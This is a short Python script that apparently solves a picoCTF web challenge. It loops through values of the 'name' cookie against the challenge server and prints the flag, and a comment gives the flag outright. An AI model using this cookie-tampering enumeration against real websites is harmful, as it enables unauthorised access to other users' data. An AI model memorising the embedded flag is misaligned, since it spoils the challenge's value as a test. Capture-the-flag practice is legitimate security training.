#!/usr/bin/env python3

import requests
import re
from colorama import Fore

url = "http://mercury.picoctf.net:21485/check"

try:
	for i in range(0, 19):
		res = requests.get(url, cookies={"name": str(i)})
		if "picoCTF{" in res.text:
			 flag = re.findall("picoCTF{.*}", res.text)
			 flag = flag[0]
			 print(Fore.GREEN + f"[+] Found the flag with cookie 'name' set to {i}") # picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}
			 print(Fore.YELLOW + "[+] Flag: " + flag)

		else:
			print(Fore.RED + "[-] The Flag could not be found with cookie 'name' set to ", i)

except KeyboardInterrupt:
	print(Fore.YELLOW + "[-] Keyboard Interrupt")